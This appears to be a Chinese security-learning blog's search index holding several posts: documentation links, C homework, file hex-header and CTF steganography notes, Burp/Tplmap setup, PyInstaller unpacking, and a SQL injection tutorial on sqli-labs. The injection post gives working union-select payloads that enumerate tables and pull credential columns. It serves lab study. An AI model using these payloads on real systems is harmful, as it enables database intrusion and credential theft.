<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>官方文档合集</title>
    <url>/2022/04/10/doc/</url>
    <content><![CDATA[<p>正在使用的语言与工具官方文档，不定期进行补充.......</p>
<span id="more"></span>
<h2 id="x00-编程语言">0x00 编程语言</h2>
<p><strong><em><a href="https://docs.python.org/zh-cn/3.8/index.html"
title="https://docs.python.org/zh-cn/3.8/index.html">python</a></em></strong></p>
<p><strong><em><a href="https://docs.oracle.com/en/java/javase/"
title="https://docs.oracle.com/en/java/javase/">Java</a></em></strong></p>
<p><strong><em><a href="https://www.php.net/docs.php"
title="https://www.php.net/docs.php">PHP</a></em></strong></p>
<p><strong><em><a
href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript"
title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">Javascript</a></em></strong></p>
<h2 id="x01-框架文档">0x01 框架文档</h2>
<p><strong><em><a href="https://hexo.io/zh-cn/docs/index.html"
title="https://hexo.io/zh-cn/docs/index.html">Hexo</a></em></strong></p>
<p><strong><em><a href="https://theme-next.org/docs.html"
title="https://theme-next.org/docs.html">Hexo主题NexT</a></em></strong></p>
<p><strong><em><a href="https://twikoo.js.org/"
title="https://twikoo.js.org/">Twikoo</a></em></strong></p>
<p><strong><em><a href="https://docs.nonebot.dev/"
title="https://docs.nonebot.dev/">NoneBot机器人</a></em></strong></p>
<h2 id="x02-工具文档">0x02 工具文档</h2>
<p><strong><em><a href="https://nmap.org/man/zh/"
title="https://nmap.org/man/zh/">nmap</a></em></strong></p>
]]></content>
      <categories>
        <category>Doc</category>
      </categories>
  </entry>
  <entry>
    <title>CINTA_01</title>
    <url>/2022/07/27/CINTA-01/</url>
    <content><![CDATA[<h3 id="cinta学前作业一课前准备">CINTA学前作业一：课前准备</h3>
<span id="more"></span>
<p>a、写一个插入排序的函数，即输入一个数组，完成排序；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert_sort</span><span class="params">(<span class="type">int</span> arr[],<span class="type">int</span> len)</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> (len &lt;= <span class="number">0</span> || arr == <span class="literal">NULL</span>)<span class="keyword">return</span>;</span><br><span class="line">	<span class="type">int</span> tmp, i, j;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		tmp = arr[i];</span><br><span class="line">		<span class="keyword">for</span>(j = i; j &gt; <span class="number">0</span> &amp;&amp; arr[j<span class="number">-1</span>] &gt; tmp; j--) &#123;</span><br><span class="line">			arr[j] = arr[j<span class="number">-1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">if</span>(j!=i)</span><br><span class="line">    		arr[j] = tmp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> arr[] = &#123; <span class="number">7</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9.22</span>,<span class="number">12</span> &#125;;</span><br><span class="line">	<span class="type">int</span> len = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	insert_sort(arr, len);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>b、完成一个函数，输入值为整数，输出该值的二进制；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> <span class="title function_">dec2bin</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">	<span class="type">int</span> j, i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> binary = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (num &gt;= <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		j = num % <span class="number">2</span>;</span><br><span class="line">		num /= <span class="number">2</span>;</span><br><span class="line">		binary += j * <span class="built_in">pow</span>(<span class="number">10</span>, i);</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	binary += num * <span class="built_in">pow</span>(<span class="number">10</span>, i);</span><br><span class="line">	<span class="keyword">return</span> binary;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> a = dec2bin(<span class="number">12</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>c、完成一个判断整数是否素数的函数，即，输入一个整数，判断其是否素数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_prime</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= num / <span class="number">2</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (num % i == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d is not prime!&quot;</span>, num);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d is prime!&quot;</span>, num);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	is_prime(<span class="number">23</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编辑数学公式：a的立方 + b的立方 = c的立方</p>
<p>​ <span class="math inline">\(a^3+b^3=c^3\)</span></p>
]]></content>
      <categories>
        <category>CINTA</category>
      </categories>
  </entry>
  <entry>
    <title>各类常见文件16进制头文件</title>
    <url>/2022/04/30/file-header/</url>
    <content><![CDATA[<p>常见文件16进制文件头汇总！！</p>
<span id="more"></span>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">文件类型</th>
<th style="text-align: left;">文件头标识</th>
<th style="text-align: left;">文件尾标识</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">.7z</td>
<td style="text-align: left;">37 7A BC AF 27 1C</td>
<td style="text-align: left;"></td>
</tr>
<tr class="even">
<td style="text-align: left;">.GIF</td>
<td style="text-align: left;">47 49 46 38</td>
<td style="text-align: left;">00 3B</td>
</tr>
<tr class="odd">
<td style="text-align: left;">.jpg</td>
<td style="text-align: left;">FF D8 FF</td>
<td style="text-align: left;">FF D9</td>
</tr>
<tr class="even">
<td style="text-align: left;">.png</td>
<td style="text-align: left;">89 50 4E 47</td>
<td style="text-align: left;">AE 42 60 82</td>
</tr>
<tr class="odd">
<td style="text-align: left;">.rar</td>
<td style="text-align: left;">52 61 72 21</td>
<td style="text-align: left;">C4 3D 7B 00 40 07 00</td>
</tr>
<tr class="even">
<td style="text-align: left;">.zip</td>
<td style="text-align: left;">50 4B 03 04</td>
<td style="text-align: left;">50 4B</td>
</tr>
<tr class="odd">
<td style="text-align: left;">.pdf</td>
<td style="text-align: left;">25 50 44 46 2D 31 2E</td>
<td style="text-align: left;"></td>
</tr>
</tbody>
</table>
<h3 id="x00-zip压缩包伪加密分析">0x00 zip压缩包伪加密分析</h3>
<p>zip压缩包16进制数据块的简单分析（详细分析的相关文章非常多，这里不再分析）</p>
<p>需要重点注意三个数据标记块：</p>
<h4 id="第一块压缩源文件数据块">0000 第一块：压缩源文件数据块</h4>
<p><img src="504B.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（并非所有zip都是这样，但是字节位置代表信息一样）</span><br><span class="line">50 4B 03 04 : 头文件标记块（固定）</span><br><span class="line">14 00 ： 解压文件所需要的pkware版本</span><br><span class="line">01 00 ： 全局方式位标记（包含压缩包是否加密，该例子中为加密状态，第二个数		 字是计数则表示加密，偶数为不加密,包括00）</span><br><span class="line">00 00 ： 压缩方式</span><br><span class="line">7A 6D ： 最后修改文件时间</span><br><span class="line">9D 54 ： 最后修改文件日期</span><br><span class="line">E5 93 8C DD ： CRC-32校验码</span><br><span class="line">15 00 00 00 ： 压缩后尺寸</span><br><span class="line">09 00 00 00 ： 未压缩尺寸</span><br><span class="line">08 00 ： 文件名长度</span><br><span class="line">00 00 ： 扩展记录长度</span><br></pre></td></tr></table></figure>
<h4 id="第二块压缩源文件目录区">0001 第二块：压缩源文件目录区</h4>
<p><img src="504B0102.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">50 4B 01 02 ： 目录中文件文件头标记</span><br><span class="line">3F 00 ： 压缩使用的pkware版本</span><br><span class="line">14 00 ： 解压文件所需pkware版本</span><br><span class="line">01 00 ： 全局方式位标记（跟数据块一样，这里表示有密码）</span><br><span class="line">00 00 ： 压缩方式</span><br><span class="line">7A 6D ： 最后修改文件时间</span><br><span class="line">9D 54 ： 最后修改文件日期</span><br><span class="line">E5 93 8C DD ： CRC-32校验</span><br><span class="line">15 00 00 00 ： 压缩后尺寸</span><br><span class="line">09 00 00 00 ： 未压缩尺寸</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h4 id="第三块压缩源文件目录结束标志">0002
第三块：压缩源文件目录结束标志</h4>
<p><img src="0506.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">50 4B 05 06 ： 目录结束标志</span><br></pre></td></tr></table></figure>
<h4 id="伪加密的辨别方法">0003 伪加密的辨别方法</h4>
<h5 id="b00-无加密">0b00 无加密</h5>
<p>压缩源文件数据区的全局加密为<code>00 00</code><strong>（或者是其他偶数的数值）</strong>，即图示中第二个方框中的内容</p>
<p>同时压缩源文件目录区的全局方式位标记也为<code>00 00</code><strong>（或者是其他偶数的数值）</strong>（同样是图示中的第二个方框中内容）</p>
<h5 id="b01-伪加密">0b01 伪加密</h5>
<p>压缩源文件数据区的全局加密为<code>00 00</code>
<strong>（或者是其他偶数的数值）</strong>，同时压缩源文件目录区的全局方式位标记为<code>01 00</code><strong>（或者是其他奇数数值）</strong>。发现伪加密时，只要将目录区的数值更改为非加密数值即可</p>
<h5 id="b10-真加密">0b10 真加密</h5>
<p>压缩源文件数据区的全局加密为<code>01 00</code>
<strong>（或者是其他奇数数值）</strong>，且压缩源文件目录区的全局方式位标记为<code>01 00</code>
<strong>（或者是其他奇数数值）</strong></p>
<h3 id="x01-rar文件头详细解析">0x01 RAR文件头详细解析</h3>
<p>以上表格中给出的为rar4的16进制文件格式，最新的rar5则有不同的16进制文件格式</p>
<p>头：<code>52 61 72 21 1A 07 01 00</code></p>
<p>尾：<code>1D 77 56 51 03 05 04 00</code></p>
<p>rar5格式的16进制文件并非像rar4一样相对固定，数块的位数（大小）是动态变化的，下面主要解析rar4格式的16进制文件(rar4文件现在比较少见，分析使用攻防世界中MISC的simpleRAR题目的文件)</p>
<p>rar文件通常包含
<strong>标记块</strong>、<strong>压缩文件头块</strong>、<strong>文件头块</strong>、<strong>注释头块</strong>，每一块中都包含以下内容：</p>
<table>
<thead>
<tr class="header">
<th>名称</th>
<th>大小</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>HEAD_CRC</td>
<td>2字节</td>
<td>所有块或块部分的CRC</td>
</tr>
<tr class="even">
<td>HEAD_TYPE</td>
<td>1字节</td>
<td>块类型</td>
</tr>
<tr class="odd">
<td>HEAD_FLAGS</td>
<td>2字节</td>
<td>块标记</td>
</tr>
<tr class="even">
<td>HEAD_SIZE</td>
<td>2字节</td>
<td>块大小</td>
</tr>
</tbody>
</table>
<p>块类型的类型有以下几个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">标记块：HEAD_TYPE=0x72</span><br><span class="line">压缩文件头：HEAD_TYPE=0x73</span><br><span class="line">文件头：HEAD_TYPE=0x74</span><br><span class="line">旧风格的注释头：HEAD_TYPE=0x75</span><br><span class="line">旧风格的用户身份信息：HEAD_TYPE=0x76</span><br><span class="line">旧风格的子块：HEAD_TYPE=0x77</span><br><span class="line">旧风格的恢复记录：HEAD_TYPE=0X78</span><br><span class="line">旧风格的用户身份信息：HEAD_TYPE=0X79</span><br><span class="line">子块：HEAD_TYPE=0x7A</span><br><span class="line">最后的结束块：HEAD_TYPE=0x7B</span><br></pre></td></tr></table></figure>
<p>下面分析几个数据块</p>
<h4 id="标记块">0000 标记块</h4>
<p><img src="rarheader.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">56 61 ： HEAD_CRC,两个字节，所有rar文件都有</span><br><span class="line">72 ： 块类型（HEAD_TYPE），标记块</span><br><span class="line">21 1A ： 块标记（HEAD_FLAGS）,两个字节</span><br><span class="line">07 00  ： 块大小，即56 61 72 21 1A 07 00 一共7个字节</span><br></pre></td></tr></table></figure>
<h4 id="压缩文件头">0001 压缩文件头</h4>
<p><img src="yasuowenjian.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CF 90 ： 压缩文件头CRC校验值</span><br><span class="line">73 ： 头类型，为压缩文件头</span><br><span class="line">00 00 ： 位标记块</span><br><span class="line">0D 00 ： 文件头大小即000D,13字节</span><br><span class="line">后面还有6个保留字节</span><br></pre></td></tr></table></figure>
<h4 id="文件头">0002 文件头</h4>
<p><img src="filehead.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">D5 56 ： HEAD_CRC,文件头的CRC校验码</span><br><span class="line">74 ： HEAD_TYPE,块类型，74表示文件头</span><br><span class="line">20 90 ： HEAD_FLAGS</span><br><span class="line">2D 00 ： HEAD_SIZE，文件头全部大小</span><br><span class="line">10 00 00 00 ：PACK_SIZE，已压缩文件大小</span><br><span class="line">10 00 00 00 ：UNP_SIZE，未压缩文件大小</span><br><span class="line">02：HOST_OS，1字节，保存压缩文件使用的操作系统，02代表windows</span><br><span class="line">C7 88 67 36 ：FILE_CRC，4字节，文件的CRC值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="结尾块">0003 结尾块</h4>
<p><img src="end.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C4 3D 7B 00 40 07 00 ： 固定的结尾块</span><br></pre></td></tr></table></figure>
<p>（所以按照此分析，攻防世界该题目的secret.png的文件头表示应该改成74）</p>
<h3 id="x02-.png文件分析">0x02 .png文件分析</h3>
<p>png文件涉及到高度、宽度的隐写，要分析16进制文件中的高度宽度的位置：</p>
<p><img src="png.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">89 50 4E 47 0D 0A 1A 0A ： 开头8个字节，表示png文件</span><br><span class="line">接下来是IHDR数据块</span><br><span class="line">00 00 00 0D ： 表示IHDR数据块长度为13字节</span><br><span class="line">48 49 44 52 ： IHDR标识</span><br><span class="line">00 00 02 C4 ： 表示图像宽，708像素（隐写的关键）</span><br><span class="line">00 00 01 61 ： 表示图像高度，353像素（隐写关键）</span><br><span class="line">08 ： 色深，表示2^8=256色图像</span><br><span class="line">06 ： 颜色类型</span><br><span class="line">00 ： PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</span><br><span class="line">00 ： 同上</span><br><span class="line">00 ： 非隔行扫描</span><br><span class="line">77 6C BC 43 ： CRC校验码</span><br></pre></td></tr></table></figure>
<p>图像宽度与高度不一定是正确的，可以用CRC校验码进行计算得出，所以图片隐写可以算出真实的高度后进行修改。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>Burpsuit安装Tplmap扩展（win10环境）</title>
    <url>/2022/04/24/burpsuit-extendtion/</url>
    <content><![CDATA[<h3 id="x00-下载jython安装文件">0x00 下载<em>jython</em>安装文件</h3>
<p>jython可以理解为在Java环境中运行pythond环境,Burpsuit运行在Java环境中，Tplmap需要python环境</p>
<span id="more"></span>
<p>链接：<a
href="https://repo1.maven.org/maven2/org/python/jython-installer/2.7.2/jython-installer-2.7.2.jar">https://repo1.maven.org/maven2/org/python/jython-installer/2.7.2/jython-installer-2.7.2.jar</a></p>
<p>在想要安装的位置创建存放的文件夹，这里创建在C盘中</p>
<figure>
<img src="path.png" alt="路径" />
<figcaption aria-hidden="true">路径</figcaption>
</figure>
<h3 id="x01-安装jython">0x01 安装jython</h3>
<p>在存放下载文件的路径中打开以管理员身份运行cmd(命令指示符)</p>
<p>输入以下指令(路径与文件名字自行更改)（不需要细讲都懂的吧？TuT）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar jython-installer-2.7.2.jar -s -d C:\jython</span><br></pre></td></tr></table></figure>
<figure>
<img src="install.png" alt="安装" />
<figcaption aria-hidden="true">安装</figcaption>
</figure>
<p>出现以下报文即安装成功</p>
<figure>
<img src="success.png" alt="success" />
<figcaption aria-hidden="true">success</figcaption>
</figure>
<h3 id="x02-添加jython环境变量">0x02 添加jython环境变量</h3>
<p>在安装目录中找到bin文件夹打开复制路径后，打开此电脑属性</p>
<p><img src="shuxing%20.png" /></p>
<p>在右侧找到系统高级设置，点击进入后，在上方选择高级，选择环境变量，在系统变量中找到Path，双击进入，将刚才复制的路径加上添加进去。</p>
<p><img src="tianjia.png" /></p>
<p><strong>重新打开一个cmd</strong>窗口，输入jython回车,出现以下内容则成功</p>
<p><img src="cmdsuccess.png" /></p>
<h3 id="x03-安装相关python模块">0x03 安装相关python模块</h3>
<p><strong>pyyaml模块</strong></p>
<p>链接：<a
href="https://github.com/yaml/pyyaml/archive/refs/tags/5.1.2.tar.gz">https://github.com/yaml/pyyaml/archive/refs/tags/5.1.2.tar.gz</a></p>
<p>下载后解压进入<code>pyyaml-5.1.2</code>目录中打开cmd执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jython setup.py install</span><br></pre></td></tr></table></figure>
<p>如果以上链接下载无法解压，可以去<a
href="https://github.com/yaml/pyyaml">https://github.com/yaml/pyyaml</a>下载源码进行再执行以上命令</p>
<p><strong>requests模块</strong></p>
<p>链接：<a
href="https://github.com/psf/requests/archive/refs/tags/v2.22.0.tar.gz">https://github.com/psf/requests/archive/refs/tags/v2.22.0.tar.gz</a></p>
<p>下载后解压进入<code>requests-2.22.0</code>目录运行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jython setup.py install</span><br></pre></td></tr></table></figure>
<p><strong><em>注意！！！！</em></strong></p>
<p>​ <strong>执行这一个命令可能会出现如下报错</strong>:</p>
<p>UnicodeDecodeError: 'ascii' codec can't decode byte 0xe9 in position
0: ordinal not in range(128)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">UnicodeDecodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t decode byte 0xe9 in position 0: ordinal not in range(128)</span></span><br></pre></td></tr></table></figure>
<p>此时找到安装jython的路径，依次打开 <code>Lib</code> -&gt;
<code>site-packages</code>
文件夹，在该文件夹下添加一个<code>sitecustomize.py</code>文件，添加如下内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>将默认的编码方式修改为utf-8.</p>
<h3 id="x04-配置burpsuit">0x04 配置Burpsuit</h3>
<p>打开burpsuit(什么？你还没有Burpsuit？那你点进来干嘛？),在上面的选项中选择
<strong><code>Extender</code></strong>,再选择
<strong><code>Options</code></strong>，在
<strong><code>Python Environment</code></strong>
的<strong><code>Location of Jython standalone JAR file</code></strong>选项中选择安装的jython中的jython.jar文件</p>
<p><img src="env.png" /></p>
<h3 id="x05-下载tplmap">0x05 下载Tplmap</h3>
<p>链接：<a
href="https://github.com/epinna/tplmap/releases/">https://github.com/epinna/tplmap/releases/</a></p>
<p>喜欢哪个版本就下载那个，推荐最新的</p>
<p>下载后解压放到喜欢的位置</p>
<h3 id="x06-添加tplmap插件到burpsuit">0x06 添加Tplmap插件到Burpsuit</h3>
<p>打开Burpsuit, 选择 <strong>Extender</strong> -&gt;
<strong>Extensions</strong>，点击<strong>Burp
Extensions</strong>下的add按钮选择下载的Tplmap文件中的<strong>burp_extension.py</strong>文件.</p>
<p><img src="extensions.png" /></p>
<p>添加成功会出现以下界面，失败则<strong>Errors</strong>中会有报错输出.</p>
<p><img src="burp_success.png" /></p>
<p>安装完成，上面的选项中出现Tplmap！</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>python打包的exe解包为.py文件</title>
    <url>/2022/02/27/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>使用的工具：</p>
<p>pyinstxtractor.py 解压工具（将exe文件解压为一个文件夹）</p>
<span id="more"></span>
<p>python包：uncompyle6,pyc反编译工具包</p>
<p>winhex或010Editor等其他二进制查看修改工具</p>
<h3 id="x00-工具安装">0x00 工具安装</h3>
<p><strong>uncompyle6安装：</strong></p>
<p>方法一：</p>
<p>pip安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install uncompyle6</span><br></pre></td></tr></table></figure>
<p>方法二：</p>
<p>使用pycharm安装，在pycharm的设置里依次点击 python解释器 —&gt; '+'</p>
<p><img src="pycharminstall.jpg" /></p>
<p><img src="uncom.jpg" /></p>
<p>在搜索框内填入要安装的包后点击安装即可</p>
<p><strong>pyinstxtractor.py工具获取：</strong></p>
<p>在网页：https://sourceforge.net/projects/pyinstallerextractor/中下载获取</p>
<p><strong>winhex工具下载</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/15xVANHw6zwS89YCXcDHoEg </span><br><span class="line">提取码：7whk</span><br></pre></td></tr></table></figure>
<h3 id="x01-exe包解压">0x01 exe包解压</h3>
<p>首先使用pyinstxtractor.py进行拆包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 pyinstxtractor.py 要拆包的文件名</span><br></pre></td></tr></table></figure>
<p>执行完后会出现一个 原文件名+_extracted的文件夹,</p>
<p><img src="exebreak.jpg" /></p>
<h3 id="x02-复原头文件">0x02 复原头文件</h3>
<p>在新生成的文件夹中存在exe文件同名且无后缀的文件与struct,用winhex打开两个文件</p>
<p>将struct文件开头的16个字节<strong>（也有说是8个字节，反正将文本为pyi0的部分都恢复回去QAQ）</strong>复制粘贴到无后缀的文件头中</p>
<p><img src="copypaste.jpg" /></p>
<p>修改后保存，将无后缀的文件添加上.pyc的后缀</p>
<h3 id="x03-逆向.pyc文件">0x03 逆向.pyc文件</h3>
<p>使用uncompyle包进行逆向</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uncompyle6 文件名.pyc &gt; 文件名.py</span><br></pre></td></tr></table></figure>
<p><img src="pyc_py.jpg" /></p>
<p>拆包完成，可以打开.py文件查看代码辣！</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入二</title>
    <url>/2022/02/25/SQL%E6%B3%A8%E5%85%A5%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="x00-get报错注入">0x00 GET报错注入</h2>
<h3 id="找出合适的闭合sql语句">0000 找出合适的闭合SQL语句</h3>
<span id="more"></span>
<h4
id="确定传入参数的sql语句包裹符号">1、确定传入参数的SQL语句包裹符号</h4>
<p>找出闭合的方法，以sqli_labs中的less1-less4为例子</p>
<p>less1中的报错提示语句为</p>
<p><img src="less1error.jpg" /></p>
<p>less2中的报错语句为</p>
<p><img src="less2error.jpg" /></p>
<p>less3中的报错语句为</p>
<p><img src="less3error.jpg" /></p>
<p>less4中的报错语句为</p>
<p><img src="less4error.jpg" /></p>
<p>​
最左边与最右边的两个单引号是报错语句引用SQL语句的部分不属于SQL语句里的一部分，单引号里面的内容分别是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1:	<span class="string">&#x27;1&#x27;&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">less2:	&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less3:	<span class="string">&#x27;1&#x27;&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">less4:	&quot;1\&quot; LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
<p>去掉输入的内容,得出大概的SQL语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less2:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span>  id  LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less3:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> (<span class="string">&#x27;id&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">less4:	<span class="keyword">select</span> ...... <span class="keyword">where</span> id <span class="operator">=</span> &quot;id&quot; LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="得出闭合语句">2、得出闭合语句</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">less1: id <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; --+(注释)</span></span><br><span class="line"><span class="string">less2: id = 1  --+</span></span><br><span class="line"><span class="string">less3: id = 1&#x27;</span>) <span class="comment">--+</span></span><br><span class="line">less4: id <span class="operator">=</span> <span class="number">1</span>&quot; --+</span><br></pre></td></tr></table></figure>
<p>输入闭合后的参数查询能正确进行</p>
<h3 id="使用order-by-语句判断字段数">0001 使用order by
语句判断字段数</h3>
<h4 id="判断字段数的原因">1、<strong>判断字段数的原因：</strong></h4>
<p><strong>在之后的<code>union select</code>的联合查询中需要利用正确的字段数进行</strong></p>
<h4 id="使用方法">2、使用方法：</h4>
<p>在确定的闭合语句的参数后面加上<code>order by 字段数</code>，字段数的选择可以从1开始往后一个一个试，也可以使用二分法进行爆破</p>
<p>在less1-less4中，知道设置字段数为3都能成功查询，设置为4则不能成功查询，由此可知字段数为3</p>
<p><img src="lessorder.jpg" /></p>
<p><img src="lessorder4.jpg" /></p>
<h3 id="使用union-select联合查询获取表名">0002 使用union
select联合查询，获取表名</h3>
<p>在使用查询之前要了解应该从哪里获取表名字段名等信息，这就得先了解数据库的结构，大致的结构可以看以下图片了解</p>
<p><img src="sqlstruct.png" /></p>
<p>由此可得我们要查询<code>tables</code>表内的表名，使用<code>union select</code>之前要使原来的查询报错才会执行联合查询的语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">0</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
<p><img src="union123.jpg" /></p>
<p>从图中可以看出<code>union</code>查询的位置在数值2跟3
的位置，可在两个位置中选一个进行注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()  --+</span></span><br></pre></td></tr></table></figure>
<p><img src="selecttable.jpg" /></p>
<p>通过查询可知在该数据库下有四个表分别为<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code>，现在查询<code>users</code>表中的字段名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;  --+</span></span><br></pre></td></tr></table></figure>
<p><img src="selectcolumn.jpg" /></p>
<p>查询到<code>users</code>表中的字段有三个，下一步查询<code>username</code>与<code>password</code>中的信息，在这之前的查询都是在汇总的
数据库<code>information_schema</code>中查询的，现在目标明确是要<code>users</code>表中的<code>usrename</code>与<code>password</code>字段里的数据，可以直接进行查询而不用到<code>information_schema</code>中查询（该数据库也不会存储字段的数据内容）</p>
